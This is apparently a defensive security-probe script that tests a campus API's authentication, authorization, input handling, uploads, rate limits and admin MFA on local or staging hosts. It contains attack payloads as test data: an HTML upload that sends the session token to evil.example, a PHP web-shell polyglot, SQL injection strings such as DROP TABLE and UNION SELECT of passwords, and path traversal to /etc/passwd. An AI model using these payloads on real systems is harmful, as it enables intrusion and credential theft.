// npm run security:probe -- --target http://localhost:4000 [--xff] [--spike 400]
//
// ACTIVE, NON-DESTRUCTIVE attack simulation against a LOCAL or STAGING CampusHub API you own.
//  - Refuses any target that isn't localhost, unless its host is listed in SECURITY_PROBE_ALLOWED_HOSTS
//    (comma-separated; for a staging environment you are authorised to test). Never point it at production.
//  - Every request carries X-Sentinel-Simulated: 1, so Sentinel files the resulting alerts as simulated (no email,
//    no IP scoring or blocking, no health impact). Production ignores the header.
//  - No denial of service: a few hundred requests at most (--spike adds one burst of N cheap GETs).
//  - Data it creates is marked "SECPROBE" and withdrawn or reverted at the end. It changes one setting and one
//    user's role, then puts both back (both changes stay in the append-only audit log, by design).
//  - With --xff the probe varies X-Forwarded-For to emulate several attackers. That only works when the target
//    trusts exactly one proxy hop (TRUST_PROXY=1), as a staging API behind a proxy does.
//
// Accounts: PROBE_STUDENT, PROBE_STUDENT2, PROBE_FACULTY, PROBE_STAFF (Electrical), PROBE_STAFF2 (another
// department), PROBE_ADMIN as "email:password". On localhost they default to the dev seed's demo accounts.
// PROBE_ROLE_TARGET: the email of a student whose role is changed and changed back (default rahul.mehta@demo.edu).
import { createHmac, randomUUID } from 'node:crypto';
import { deflateSync } from 'node:zlib';
import { Report, arg } from './lib.mjs';

const TARGET = String(arg('target', process.env.SECURITY_PROBE_TARGET ?? '')).replace(/\/+$/, '');
const ORIGIN = process.env.PROBE_ORIGIN ?? 'http://localhost:5173';
const XFF = !!arg('xff');
const SPIKE = Number(arg('spike', 0)) || 0;
if (!TARGET) {
  console.error('Usage: npm run security:probe -- --target http://localhost:4000 [--xff] [--spike 400]');
  process.exit(2);
}
const host = new URL(TARGET).hostname;
const allowed = ['localhost', '127.0.0.1', '::1', '[::1]', ...(process.env.SECURITY_PROBE_ALLOWED_HOSTS ?? '').split(',').map((s) => s.trim()).filter(Boolean)];
if (!allowed.includes(host)) {
  console.error(`Refusing to probe ${host}: not localhost and not in SECURITY_PROBE_ALLOWED_HOSTS.`);
  console.error('Only test environments you own or are authorised to assess, and never production.');
  process.exit(2);
}
const local = ['localhost', '127.0.0.1', '::1', '[::1]'].includes(host);
function account(envName, fallback) {
  const v = process.env[envName] ?? (local ? fallback : undefined);
  if (!v) return null;
  const i = v.indexOf(':');
  return { email: v.slice(0, i), password: v.slice(i + 1) };
}
const A = {
  student: account('PROBE_STUDENT', 'student@demo.edu:Student12345'),
  student2: account('PROBE_STUDENT2', 'ananya.iyer@demo.edu:Student12345'),
  faculty: account('PROBE_FACULTY', 'faculty@demo.edu:Faculty12345'),
  staff: account('PROBE_STAFF', 'staff.electrical@demo.edu:Staff12345'),
  staff2: account('PROBE_STAFF2', 'staff.plumbing@demo.edu:Staff12345'),
  admin: account('PROBE_ADMIN', 'admin@demo.edu:Admin12345'),
};
const ROLE_TARGET = process.env.PROBE_ROLE_TARGET ?? (local ? 'rahul.mehta@demo.edu' : null);

const report = new Report('Active probe', 'active (simulated)');
/** Sentinel rules each section should trip, for the cross-check in the run summary. */
const expectedRules = new Set();
const cleanup = [];

// ───────────────────────────── HTTP ─────────────────────────────
let ipSeq = 0;
const ip = (block = '203.0.113') => `${block}.${(ipSeq++ % 200) + 20}`;
async function h(path, { method = 'GET', token, body, ip: from, headers = {}, form, raw } = {}) {
  const hd = { origin: ORIGIN, 'x-sentinel-simulated': '1', ...headers };
  if (token) hd.authorization = `Bearer ${token}`;
  if (XFF && from) hd['x-forwarded-for'] = from;
  let payload;
  if (form) payload = form;
  else if (raw !== undefined) payload = raw;
  else if (body !== undefined) {
    payload = JSON.stringify(body);
    hd['content-type'] = 'application/json';
  }
  const t0 = performance.now();
  const res = await fetch(`${TARGET}${path}`, { method, headers: hd, body: payload, redirect: 'manual', signal: AbortSignal.timeout(30_000) });
  const text = await res.text();
  let json = null;
  try {
    json = JSON.parse(text);
  } catch {
    /* not JSON */
  }
  return { status: res.status, code: json?.error?.code ?? json?.code ?? null, json, text, ms: Math.round(performance.now() - t0), headers: Object.fromEntries(res.headers) };
}
async function signIn(acc, from) {
  const r = await h('/api/auth/sign-in/email', { method: 'POST', body: { email: acc.email, password: acc.password }, ip: from });
  return r.headers['set-auth-token'] ?? null;
}
const noLeak = (text) => !/\bat [\w.<>]+ \(|node_modules|[A-Z]:\\|\/opt\/render|stack/i.test(text);

// ───────────────────────────── TOTP (two-step verification) ─────────────────────────────
function base32(s) {
  const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
  let bits = '';
  for (const c of s.replace(/\s+/g, '').replace(/=+$/, '').toUpperCase()) bits += alphabet.indexOf(c).toString(2).padStart(5, '0');
  return Buffer.from(bits.match(/.{8}/g).map((b) => parseInt(b, 2)));
}
function totp(secret, offset = 0) {
  const counter = Buffer.alloc(8);
  counter.writeBigUInt64BE(BigInt(Math.floor(Date.now() / 30_000) + offset));
  const mac = createHmac('sha1', base32(secret)).update(counter).digest();
  const o = mac[mac.length - 1] & 0xf;
  return String((mac.readUInt32BE(o) & 0x7fffffff) % 1_000_000).padStart(6, '0');
}

// ───────────────────────────── test files ─────────────────────────────
function crc32(buf) {
  let c = ~0;
  for (const b of buf) {
    c ^= b;
    for (let k = 0; k < 8; k++) c = (c >>> 1) ^ (0xedb88320 & -(c & 1));
  }
  return ~c >>> 0;
}
function chunk(type, data) {
  const len = Buffer.alloc(4);
  len.writeUInt32BE(data.length);
  const td = Buffer.concat([Buffer.from(type), data]);
  const crc = Buffer.alloc(4);
  crc.writeUInt32BE(crc32(td));
  return Buffer.concat([len, td, crc]);
}
function png(width, height, rows = null) {
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(width, 0);
  ihdr.writeUInt32BE(height, 4);
  ihdr[8] = 8; // bit depth
  ihdr[9] = 2; // RGB
  let raw = rows;
  if (!raw) {
    // Each scanline: filter byte 0 (None), then RGB pixels.
    raw = Buffer.alloc((width * 3 + 1) * height, 0x80);
    for (let y = 0; y < height; y++) raw[y * (width * 3 + 1)] = 0;
  }
  return Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), chunk('IHDR', ihdr), chunk('IDAT', deflateSync(raw)), chunk('IEND', Buffer.alloc(0))]);
}
const FILES = {
  svgScript: { name: 'photo.png', type: 'image/png', data: Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>') },
  html: { name: 'photo.jpg', type: 'image/jpeg', data: Buffer.from('<!doctype html><script>fetch("//evil.example/"+localStorage.getItem("campushub.session"))</script>') },
  // Declares 60 000 × 60 000 pixels (3.6 gigapixels) in a few hundred bytes: a decompression bomb.
  pixelBomb: { name: 'bomb.png', type: 'image/png', data: png(60_000, 60_000, Buffer.alloc(1024)) },
  tooLarge: { name: 'huge.png', type: 'image/png', data: Buffer.concat([png(8, 8), Buffer.alloc(6 * 1024 * 1024, 0x41)]) },
  // A valid image with a PHP payload after the end marker: accepted, and the payload must not survive re-encoding.
  polyglot: { name: 'notes.png', type: 'image/png', data: Buffer.concat([png(320, 240), Buffer.from("<?php system($_GET['c']); ?>")]) },
};

// ───────────────────────────── 1. Authentication ─────────────────────────────
async function authentication() {
  const sprayIp = ip();
  const results = [];
  for (let i = 0; i < 12; i++) results.push(await h('/api/auth/sign-in/email', { method: 'POST', body: { email: `secprobe-spray-${i}@demo.edu`, password: 'Spring2026!' }, ip: sprayIp }));
  report.expect('AUTH-01', 'Password spraying: 12 wrong sign-ins over 12 accounts are all refused', results.every((r) => r.status === 401), results.map((r) => r.status).join(' '));
  expectedRules.add('brute_force_ip').add('password_spraying');

  const victim = `secprobe-victim-${Date.now()}@demo.edu`;
  const per = [];
  for (let i = 0; i < 10; i++) per.push(await h('/api/auth/sign-in/email', { method: 'POST', body: { email: victim, password: `Guess-${i}-x` }, ip: `198.51.100.${30 + (i % 5)}` }));
  report.expect('AUTH-02', 'One account attacked from 5 addresses: every guess refused', per.every((r) => r.status === 401 || r.status === 429), per.map((r) => r.status).join(' '));
  if (XFF) expectedRules.add('account_under_attack');
  else report.add('AUTH-02b', 'Account-under-attack needs several source addresses', 'skip', { detail: 'run with --xff against a target that trusts one proxy hop' });

  const lockAcc = `secprobe-lock-${Date.now()}@demo.edu`;
  const lockIp = ip();
  const tries = [];
  for (let i = 0; i < 6; i++) tries.push(await h('/api/auth/sign-in/email', { method: 'POST', body: { email: lockAcc, password: `Wrong-${i}-pass` }, ip: lockIp }));
  const last = tries.at(-1);
  report.expect('AUTH-03', 'Per-account back-off: the 6th try is locked out (F-02)', last.status === 429 && last.code === 'SIGN_IN_LOCKED' && !!last.headers['retry-after'], `${tries.map((r) => r.status).join(' ')} · ${last.code}`);

  if (A.student) {
    const known = await h('/api/auth/sign-in/email', { method: 'POST', body: { email: A.student.email, password: 'Definitely-wrong-1' }, ip: ip() });
    const unknown = await h('/api/auth/sign-in/email', { method: 'POST', body: { email: `nobody-${Date.now()}@demo.edu`, password: 'Definitely-wrong-1' }, ip: ip() });
    report.expect('AUTH-04', 'Wrong password: same answer for existing and unknown accounts', known.status === unknown.status && known.text === unknown.text, `${known.status}/${unknown.status}`);
    const tk = [];
    const tu = [];
    for (let i = 0; i < 5; i++) {
      tk.push((await h('/api/auth/sign-in/email', { method: 'POST', body: { email: A.student.email, password: `Timing-${i}-x` }, ip: ip() })).ms);
      tu.push((await h('/api/auth/sign-in/email', { method: 'POST', body: { email: `nobody-${i}-${Date.now()}@demo.edu`, password: `Timing-${i}-x` }, ip: ip() })).ms);
    }
    const med = (a) => [...a].sort((x, y) => x - y)[2];
    const diff = Math.abs(med(tk) - med(tu));
    report.expect('AUTH-05', 'Sign-in timing does not reveal which accounts exist', diff < 150, `median ${med(tk)} ms (existing) vs ${med(tu)} ms (unknown)`, 'warn');
  }

  const bogus = await h('/api/v1/me', { token: 'not.a.real-token' });
  report.expect('AUTH-06', 'A forged bearer token is refused', bogus.status === 401, bogus.status);
  if (A.student) {
    const t = await signIn(A.student, ip());
    const out = await h('/api/auth/sign-out', { method: 'POST', token: t, body: {} });
    const after = await h('/api/v1/me', { token: t });
    report.expect('AUTH-07', 'A token stops working after sign-out', out.status === 200 && after.status === 401, `sign-out ${out.status}, reuse ${after.status}`);
  }
  const reset1 = await h('/api/auth/request-password-reset', { method: 'POST', body: { email: `nobody-${Date.now()}@demo.edu`, redirectTo: `${ORIGIN}/reset-password` }, ip: ip() });
  if (A.student2) {
    const reset2 = await h('/api/auth/request-password-reset', { method: 'POST', body: { email: A.student2.email, redirectTo: `${ORIGIN}/reset-password` }, ip: ip() });
    report.expect('AUTH-08', 'Password reset: same answer for existing and unknown accounts', reset1.status === reset2.status && reset1.text === reset2.text, `${reset1.status}/${reset2.status}`);
  }
  const evilReset = await h('/api/auth/request-password-reset', { method: 'POST', body: { email: `nobody-${Date.now()}@demo.edu`, redirectTo: 'https://evil.example/steal' }, ip: ip() });
  report.expect('AUTH-09', 'Password reset refuses a foreign redirect URL (no token leak)', evilReset.status >= 400 && evilReset.status < 500, `${evilReset.status} ${evilReset.code ?? ''}`);
}

// ───────────────────────────── 2. Authorization ─────────────────────────────
async function authorization(tokens) {
  const anonIp = ip('198.51.100');
  const paths = ['/api/v1/admin/users', '/api/v1/admin/settings', '/api/v1/admin/audit-logs', '/api/v1/admin/bookings/export.csv', '/api/v1/admin/complaints', '/api/v1/admin/dashboard'];
  const anon = [];
  for (const p of paths) anon.push(await h(p, { ip: anonIp }));
  report.expect('AUTHZ-01', 'Anonymous calls to 6 admin endpoints are refused', anon.every((r) => r.status === 401), anon.map((r) => r.status).join(' '));
  expectedRules.add('admin_probing');

  if (tokens.faculty) {
    const r = [];
    for (const p of ['/api/v1/admin/users', '/api/v1/admin/settings', '/api/v1/admin/audit-logs']) r.push(await h(p, { token: tokens.faculty, ip: ip() }));
    report.expect('AUTHZ-02', 'A faculty member is refused on the admin API (3 tries)', r.every((x) => x.status === 403 && x.code === 'FORBIDDEN'), r.map((x) => `${x.status} ${x.code}`).join(', '));
    expectedRules.add('member_admin_api');
  }
  if (tokens.staff) {
    const r = await h('/api/v1/admin/users', { token: tokens.staff, ip: ip() });
    report.expect('AUTHZ-03', 'Department staff are refused on the admin API', r.status === 403, `${r.status} ${r.code}`);
  }
  if (tokens.student) {
    const r = await h('/api/v1/staff/complaints', { token: tokens.student, ip: ip() });
    report.expect('AUTHZ-04', "A student is refused on the staff workspace", r.status === 403, `${r.status} ${r.code}`);
  }

  // IDOR: a complaint filed by one student, read by another student and by another department.
  if (tokens.student && tokens.student2) {
    const cats = await h('/api/v1/complaint-categories', { token: tokens.student });
    const cat = (cats.json?.data ?? []).find((c) => /electric/i.test(c.name ?? c.slug ?? '')) ?? cats.json?.data?.[0];
    const own = await h('/api/v1/complaints', { method: 'POST', token: tokens.student, body: { categoryId: cat?.id, title: 'SECPROBE ownership check', description: 'Created by the security probe; withdrawn at the end.' } });
    if (own.status === 201 && own.json?.data?.id) {
      const id = own.json.data.id;
      cleanup.push(() => h(`/api/v1/complaints/${id}/withdraw`, { method: 'POST', token: tokens.student, body: { version: own.json.data.version, reason: 'Security probe clean-up' } }));
      const other = await h(`/api/v1/complaints/${id}`, { token: tokens.student2 });
      report.expect('AUTHZ-05', "Another student can't read someone's complaint, and gets 404 (no existence leak)", other.status === 404, `${other.status} ${other.code}`);
      if (tokens.staff2) {
        const dept = await h(`/api/v1/staff/complaints/${id}`, { token: tokens.staff2 });
        report.expect('AUTHZ-06', "Another department's staff can't read it", dept.status === 404, `${dept.status} ${dept.code}`);
      }
      if (tokens.staff) {
        const mine = await h(`/api/v1/staff/complaints/${id}`, { token: tokens.staff });
        report.expect('AUTHZ-07', 'Control: the right department can read it', mine.status === 200, mine.status);
      }
      const act = await h(`/api/v1/complaints/${id}/withdraw`, { method: 'POST', token: tokens.student2, body: { version: own.json.data.version } });
      report.expect('AUTHZ-08', "Another student can't act on it (withdraw)", act.status === 404, `${act.status} ${act.code}`);
    } else report.add('AUTHZ-05', 'Complaint ownership checks', 'skip', { detail: `could not file the test complaint: ${own.status} ${own.code}` });
  }
  if (tokens.student2) {
    const enumIp = ip();
    const misses = [];
    for (let i = 0; i < 22; i++) misses.push(await h(`/api/v1/bookings/${randomUUID()}`, { token: tokens.student2, ip: enumIp }));
    report.expect('AUTHZ-09', 'Record enumeration: 22 guessed booking ids all answer 404', misses.every((r) => r.status === 404), [...new Set(misses.map((r) => r.status))].join(' '));
    expectedRules.add('object_enumeration');
  }
  if (tokens.student) {
    const before = (await h('/api/v1/me', { token: tokens.student })).json?.data?.role;
    const r1 = await h('/api/v1/me', { method: 'PATCH', token: tokens.student, body: { fullName: 'Priya Sharma', role: 'super_admin' } });
    const r2 = await h('/api/v1/me', { method: 'PATCH', token: tokens.student, raw: '{"fullName":"Priya Sharma","__proto__":{"role":"super_admin"},"constructor":{"prototype":{"isAdmin":true}}}', headers: { 'content-type': 'application/json' } });
    const after = (await h('/api/v1/me', { token: tokens.student })).json?.data?.role;
    report.expect('AUTHZ-10', 'Mass assignment: a student cannot set their own role', r1.status === 400 && after === before, `${r1.status} ${r1.code}; role ${before} → ${after}`);
    report.expect('AUTHZ-11', 'Prototype pollution keys are rejected', r2.status === 400 && after === before, `${r2.status} ${r2.code}`);
    const r3 = await h('/api/v1/bookings', { method: 'POST', token: tokens.student, body: { venueId: randomUUID(), date: '2030-01-01', startTime: '10:00', endTime: '11:00', purpose: 'SECPROBE', status: 'confirmed', requesterId: randomUUID() } });
    report.expect('AUTHZ-12', 'Mass assignment: status / requesterId in a booking are rejected', r3.status === 400, `${r3.status} ${r3.code}`);
  }
}

// ───────────────────────────── 3. Injection and input handling ─────────────────────────────
async function injection(tokens) {
  if (!tokens.student) return report.add('INJ', 'Injection checks', 'skip', { detail: 'no student account' });
  const injIp = ip();
  const payloads = [
    ["' OR '1'='1", 'sql'],
    ["'; DROP TABLE venues; --", 'sql'],
    ["x' UNION SELECT email, password FROM auth_accounts --", 'sql'],
    ["1' AND (SELECT pg_sleep(3)) IS NULL --", 'sql-time'],
    ['<script>alert(1)</script>', 'xss'],
    ['../../../../etc/passwd', 'traversal'],
    ['{{constructor.constructor("return process")()}}', 'template'],
  ];
  const all = await h('/api/v1/venues', { token: tokens.student });
  const baseline = all.json?.meta?.total ?? all.json?.data?.length ?? null;
  for (const [p, kind] of payloads) {
    for (const path of ['/api/v1/venues?q=', '/api/v1/complaints?q=', '/api/v1/bookings?q=']) {
      const r = await h(`${path}${encodeURIComponent(p)}`, { token: tokens.student, ip: injIp });
      const ok = r.status < 500 && noLeak(r.text) && (kind !== 'sql-time' || r.ms < 2500);
      const rows = r.json?.meta?.total ?? r.json?.data?.length;
      const widened = kind === 'sql' && path.startsWith('/api/v1/venues') && baseline !== null && rows !== undefined && rows === baseline && baseline > 0;
      report.expect('INJ-01', `${kind} payload in ${path.split('?')[0]}`, ok && !widened, `${r.status} in ${r.ms} ms${widened ? ' · returned every venue: filter bypassed?' : ''}`);
    }
  }
  expectedRules.add('injection_probing');

  const xss = await h('/api/v1/suggestions', { method: 'POST', token: tokens.student, body: { subject: 'SECPROBE <script>alert(1)</script>', message: 'SECPROBE <img src=x onerror=alert(document.cookie)> please ignore this test.' } });
  report.expect('INJ-02', 'Stored script-like text is kept as text and served as JSON (never HTML)', xss.status < 500 && /application\/json/.test(xss.headers['content-type'] ?? ''), `${xss.status} ${xss.headers['content-type']}`);
  const big = await h('/api/v1/me', { method: 'PATCH', token: tokens.student, raw: JSON.stringify({ fullName: 'x'.repeat(200_000) }), headers: { 'content-type': 'application/json' } });
  report.expect('INJ-03', 'A 200 KB JSON body is refused cleanly', big.status === 400 || big.status === 413, `${big.status} ${big.code}`);
  const bad = await h('/api/v1/me', { method: 'PATCH', token: tokens.student, raw: '{"fullName": "x",,,}', headers: { 'content-type': 'application/json' } });
  report.expect('INJ-04', 'Malformed JSON gets a 400 with no stack trace or file paths', bad.status === 400 && noLeak(bad.text), `${bad.status} ${bad.text.slice(0, 80)}`);
  const trav = await h('/api/v1/venues/..%2f..%2fadmin%2fusers', { token: tokens.student });
  report.expect('INJ-05', 'Encoded path traversal does not reach the admin API', trav.status !== 200 || !/"email"/.test(trav.text), trav.status);
  const files = await h('/dev-files/..%2f..%2f..%2f.env');
  report.expect('INJ-06', 'Private file route refuses traversal and unsigned requests', files.status === 404 || files.status === 400, files.status);
  const nul = await h(`/api/v1/venues/${encodeURIComponent('abc\u0000def')}`, { token: tokens.student });
  report.expect('INJ-07', 'NUL bytes and junk ids are rejected without a server error', nul.status < 500, nul.status);
}

// ───────────────────────────── 4. Uploads ─────────────────────────────
async function uploads(tokens) {
  const tok = tokens.student2;
  if (!tok) return report.add('UPL', 'Upload checks', 'skip', { detail: 'no second student account' });
  const cats = await h('/api/v1/complaint-categories', { token: tok });
  const cat = cats.json?.data?.[0];
  async function send(file) {
    const form = new FormData();
    form.append('data', JSON.stringify({ categoryId: cat?.id, title: `SECPROBE upload ${file.name}`, description: 'Security probe upload check; withdrawn at the end.' }));
    form.append('photos', new Blob([file.data], { type: file.type }), file.name);
    return h('/api/v1/complaints', { method: 'POST', token: tok, form });
  }
  for (const [key, label] of [
    ['svgScript', 'SVG with a script, named .png'],
    ['html', 'HTML page named .jpg'],
    ['pixelBomb', 'Decompression bomb (3.6 gigapixels declared)'],
    ['tooLarge', '6 MB file'],
  ]) {
    const r = await send(FILES[key]);
    report.expect(`UPL-${key}`, `${label} is rejected`, r.status >= 400 && r.status < 500, `${r.status} ${r.code}`);
  }
  expectedRules.add('suspicious_uploads');
  const alive = await h('/health');
  report.expect('UPL-alive', 'The API is still healthy after the hostile uploads', alive.status === 200, alive.status);

  const poly = await send(FILES.polyglot);
  if (poly.status === 201 && poly.json?.data?.id) {
    const c = poly.json.data;
    cleanup.push(() => h(`/api/v1/complaints/${c.id}/withdraw`, { method: 'POST', token: tok, body: { version: c.version, reason: 'Security probe clean-up' } }));
    const detail = await h(`/api/v1/complaints/${c.id}`, { token: tok });
    const att = detail.json?.data?.attachments?.report?.[0];
    if (att?.url) {
      const url = att.url.startsWith('http') ? att.url : `${TARGET}${att.url}`;
      const img = Buffer.from(await (await fetch(url, { signal: AbortSignal.timeout(30_000) })).arrayBuffer());
      const webp = img.subarray(0, 4).toString() === 'RIFF' && img.subarray(8, 12).toString() === 'WEBP';
      report.expect('UPL-polyglot', 'An image carrying a PHP payload is re-encoded: the payload is gone', !img.includes('<?php') && webp, `${img.length} bytes, ${webp ? 'WebP' : 'not WebP'}`);
      const unsigned = await fetch(url.split('?')[0], { signal: AbortSignal.timeout(30_000) });
      report.expect('UPL-signed', 'A complaint photo URL without its signature is refused', unsigned.status >= 400, unsigned.status);
    } else report.add('UPL-polyglot', 'Polyglot re-encoding', 'skip', { detail: 'no attachment URL in the complaint' });
  } else report.add('UPL-polyglot', 'A valid image with a trailing payload is accepted (then checked)', 'fail', { detail: `${poly.status} ${poly.code}` });
}

// ───────────────────────────── 5. Rate limits ─────────────────────────────
async function rateLimits() {
  const from = ip('198.51.100');
  const r = [];
  for (let i = 0; i < 11; i++) r.push(await h('/api/v1/auth/register', { method: 'POST', body: { email: 'not-an-email' }, ip: from }));
  const first429 = r.findIndex((x) => x.status === 429);
  report.expect('RATE-01', 'Self-registration is rate limited per address (5 an hour)', first429 >= 0 && first429 <= 5 && r.slice(first429).every((x) => x.status === 429), `${r.map((x) => x.status).join(' ')}`);
  report.expect('RATE-02', 'A 429 says when to retry', !!r.find((x) => x.status === 429)?.headers['retry-after'], r.find((x) => x.status === 429)?.headers['retry-after'] ?? 'none', 'warn');
  if (XFF) expectedRules.add('rate_limit_abuse');
  else report.add('RATE-03', 'Rate-limit abuse detection needs an address that is not shared with the other checks', 'skip', { detail: 'run with --xff' });
}

// ───────────────────────────── 6. Super Admin, two-step verification, admin changes ─────────────────────────────
async function superAdmin() {
  if (!A.admin) return report.add('ADM', 'Super Admin checks', 'skip', { detail: 'no PROBE_ADMIN account' });
  const adminIp = `192.0.2.${100 + Math.floor(Math.random() * 100)}`; // a new address for this admin
  const token = await signIn(A.admin, adminIp);
  if (!token) return report.add('ADM-00', 'Super Admin sign-in', 'fail', { detail: 'could not sign in' });
  if (XFF) expectedRules.add('admin_new_ip');
  const first = await h('/api/v1/admin/users', { token });
  let usable = first.status === 200;
  if (first.status === 200) {
    report.add('ADM-01', 'Admin area without a second step', 'info', { detail: 'this target runs SUPER_ADMIN_MFA=off (password-only sign-in); the two-step checks are skipped' });
  } else if (first.code === 'MFA_ENROLLMENT_REQUIRED') {
    report.add('ADM-01', 'Admin area is closed until two-step verification is set up', 'pass', { detail: first.code });
    const setup = await h('/api/v1/me/mfa/setup', { method: 'POST', token, body: { password: A.admin.password } });
    const secret = setup.json?.data?.secret;
    const wrong = await h('/api/v1/me/mfa/enable', { method: 'POST', token, body: { code: String((Number(totp(secret)) + 500_000) % 1_000_000).padStart(6, '0') } });
    report.expect('ADM-02', 'Enrolment refuses a wrong code', wrong.status === 422 && wrong.code === 'MFA_INVALID_CODE', `${wrong.status} ${wrong.code}`);
    const ok = await h('/api/v1/me/mfa/enable', { method: 'POST', token, body: { code: totp(secret) } });
    report.expect('ADM-03', 'Enrolment with the right code succeeds and returns recovery codes', ok.status === 200 && Array.isArray(ok.json?.data?.recoveryCodes ?? ok.json?.data?.codes), ok.status);
    usable = ok.status === 200;
    // A second session must pass the second step; wrong codes lock it.
    const t2 = await signIn(A.admin, adminIp);
    const blocked = await h('/api/v1/admin/users', { token: t2 });
    report.expect('ADM-04', 'A new session is held at the second step', blocked.status === 403 && blocked.code === 'MFA_REQUIRED', `${blocked.status} ${blocked.code}`);
    const fails = [];
    for (let i = 0; i < 6; i++) fails.push(await h('/api/v1/me/mfa/verify', { method: 'POST', token: t2, body: { code: String((Number(totp(secret)) + 400_000 + i) % 1_000_000).padStart(6, '0') } }));
    report.expect('ADM-05', 'Repeated wrong codes pause the second step (MFA_LOCKED)', fails.some((f) => f.code === 'MFA_LOCKED'), fails.map((f) => f.code).join(', '));
    expectedRules.add('mfa_failures');
    const replay = await h('/api/v1/me/mfa/verify', { method: 'POST', token: t2, body: { code: totp(secret) } });
    report.expect('ADM-06', 'Even the right code is refused while paused', replay.status !== 200, `${replay.status} ${replay.code}`);
    report.add('ADM-07', 'Reset the probe admin afterwards', 'info', { detail: `npm run reset-mfa -w @campushub/backend -- --email ${A.admin.email} (local)` });
  } else if (first.code === 'MFA_REQUIRED') {
    report.add('ADM-01', 'Admin already enrolled in two-step verification', 'skip', { detail: 'reset it (npm run reset-mfa) to let the probe enrol and test it' });
  } else report.add('ADM-01', 'Admin area', 'fail', { detail: `${first.status} ${first.code}` });

  if (!usable) return;
  const s = await h('/api/v1/admin/settings', { token });
  const v = s.json?.data?.maxActivePerUser;
  if (typeof v === 'number') {
    const ch = await h('/api/v1/admin/settings', { method: 'PATCH', token, body: { maxActivePerUser: v === 100 ? 99 : v + 1 } });
    const back = await h('/api/v1/admin/settings', { method: 'PATCH', token, body: { maxActivePerUser: v } });
    report.expect('ADM-08', 'A settings change is applied and reverted (recorded for review)', ch.status === 200 && back.status === 200, `${ch.status}/${back.status}`);
    expectedRules.add('config_change');
  }
  if (ROLE_TARGET) {
    const u = await h(`/api/v1/admin/users?q=${encodeURIComponent(ROLE_TARGET)}`, { token });
    const target = (u.json?.data ?? []).find((x) => x.email === ROLE_TARGET);
    if (target && target.role === 'student') {
      const up = await h(`/api/v1/admin/users/${target.id}`, { method: 'PATCH', token, body: { role: 'faculty_staff' } });
      const down = await h(`/api/v1/admin/users/${target.id}`, { method: 'PATCH', token, body: { role: 'student' } });
      report.expect('ADM-09', 'A role change is applied and reverted (recorded for review)', up.status === 200 && down.status === 200, `${up.status}/${down.status}`);
      expectedRules.add('privilege_change');
    } else report.add('ADM-09', 'Role change', 'skip', { detail: `${ROLE_TARGET} not found as a student` });
    const self = await h('/api/v1/admin/users', { token, method: 'GET' });
    const me = (self.json?.data ?? []).find((x) => x.role === 'super_admin');
    if (me) {
      const esc = await h(`/api/v1/admin/users/${me.id}`, { method: 'PATCH', token, body: { role: 'student' } });
      report.expect('ADM-10', 'A Super Admin account cannot be changed through the API', esc.status >= 400 && esc.status < 500, `${esc.status} ${esc.code}`);
    }
  }
  const promote = await h('/api/v1/admin/users', { method: 'POST', token, body: { email: `secprobe-${Date.now()}@demo.edu`, fullName: 'Probe Escalation', role: 'super_admin', temporaryPassword: 'Probe-Passw0rd-2026' } });
  report.expect('ADM-11', 'The API cannot create another Super Admin', promote.status === 400, `${promote.status} ${promote.code}`);
}

// ───────────────────────────── 7. Traffic spike (optional) ─────────────────────────────
async function spike() {
  const t0 = Date.now();
  let ok = 0;
  const batch = 25;
  for (let i = 0; i < SPIKE; i += batch) {
    const rs = await Promise.all(Array.from({ length: Math.min(batch, SPIKE - i) }, () => h('/api/v1/settings/public', { ip: ip('100.64.0') })));
    ok += rs.filter((r) => r.status === 200).length;
  }
  report.add('SPIKE-01', `Traffic burst: ${SPIKE} requests`, 'info', { detail: `${ok} answered 200 in ${Math.round((Date.now() - t0) / 1000)} s` });
  expectedRules.add('traffic_spike');
}

// ───────────────────────────── run ─────────────────────────────
const health = await h('/health').catch((e) => ({ status: 0, text: e.message }));
if (health.status !== 200) {
  console.error(`Target not reachable: ${TARGET}/health → ${health.status} ${health.text}`);
  process.exit(2);
}
console.log(`Probing ${TARGET} (simulated traffic${XFF ? ', varied X-Forwarded-For' : ''})…`);
const tokens = {};
for (const k of ['student', 'student2', 'faculty', 'staff', 'staff2']) if (A[k]) tokens[k] = await signIn(A[k], ip('192.0.2'));
await authentication();
await authorization(tokens);
await injection(tokens);
await uploads(tokens);
await rateLimits();
await superAdmin();
if (SPIKE) await spike();
for (const fn of cleanup) await fn().catch(() => undefined);
report.add('CLEANUP', 'Probe data withdrawn / reverted', 'info', { detail: `${cleanup.length} complaint(s) withdrawn; settings and role changes reverted above` });
report.add('EXPECTED', 'Sentinel rules this run should trip', 'info', { detail: [...expectedRules].sort().join(', ') });
report.print();
const dir = report.save();
await import('node:fs').then((fs) => fs.writeFileSync(`${dir}/expected-rules.json`, JSON.stringify([...expectedRules].sort())));
process.exitCode = report.failed ? 1 : 0;
